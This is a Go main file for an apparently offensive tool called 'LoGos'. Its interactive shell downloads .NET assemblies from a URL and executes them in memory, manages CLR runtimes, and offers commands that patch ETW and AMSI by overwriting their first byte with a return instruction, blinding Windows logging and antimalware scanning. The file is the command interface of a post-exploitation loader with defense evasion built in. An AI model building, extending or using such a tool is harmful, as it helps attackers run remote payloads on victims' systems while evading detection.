package main

import (
	"logos/commands"
	"logos/loader"

	"github.com/abiosoft/ishell/v2"
)

func main() {

	loader.Initialize()

	shell := ishell.New()

	shell.Println("LoGos")

	shell.AddCmd(&ishell.Cmd{
		Name:    "load",
		Aliases: []string{"l"},
		Help:    "load assembly: load <url>",
		Func:    commands.DownloadAssembly,
	})

	shell.AddCmd(&ishell.Cmd{
		Name:    "exec",
		Aliases: []string{"e"},
		Help:    "execute assembly: exec <assembly_name> <...args>",
		Func:    commands.ExecuteAssembly,
	})

	shell.AddCmd(&ishell.Cmd{
		Name:    "list",
		Aliases: []string{"ls"},
		Help:    "list assemblies",
		Func:    commands.ListAssemblies,
	})

	shell.AddCmd(&ishell.Cmd{
		Name:    "listruntimes",
		Aliases: []string{"listrt", "lrt"},
		Help:    "list available runtimes",
		Func:    commands.ListRuntimes,
	})

	shell.AddCmd(&ishell.Cmd{
		Name:    "isloadable",
		Aliases: []string{"loadable"},
		Help:    "check if runtime is loadable: isloadable <runtime>",
		Func:    commands.IsRuntimeLoadable,
	})

	shell.AddCmd(&ishell.Cmd{
		Name:    "getruntime",
		Aliases: []string{"grt", "rt"},
		Help:    "get current runtime string",
		Func:    commands.CurrentRuntime,
	})

	shell.AddCmd(&ishell.Cmd{
		Name:    "setruntime",
		Aliases: []string{"srt"},
		Help:    "set current runtime string: setruntime <runtime>",
		Func:    commands.SetCurrentRuntime,
	})

	shell.AddCmd(&ishell.Cmd{
		Name: "patchetw",
		Help: "patches etw by overwriting the first byte with 0xc3 <ret>",
		Func: commands.PatchETW,
	})

	shell.AddCmd(&ishell.Cmd{
		Name: "patchamsi",
		Help: "patches amsi by overwriting the first byte with 0xc3 <ret>",
		Func: commands.PatchAMSI,
	})

	shell.Run()
}
